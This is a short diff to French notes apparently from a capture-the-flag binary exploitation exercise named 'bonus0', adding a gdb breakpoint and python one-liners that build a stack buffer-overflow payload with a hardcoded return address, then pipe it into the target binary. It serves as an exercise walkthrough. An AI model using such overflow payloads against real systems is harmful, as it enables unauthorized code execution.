@@ -49,3 +49,7 @@ Pour ecrire dans l'entree standard via une commande utiliser cette syntax :
 =========================================================================
 
 break for input: break *0x080484e6
+
+python -c 'print "A" * 9 + "\x70\xf8\xff\xbf" + "A" * 70' > /tmp/str2
+python -c 'print "A"* 20' > /tmp/str1
+(cat /tmp/str2; cat ) | (cat /tmp/str1; cat ) |./bonus0
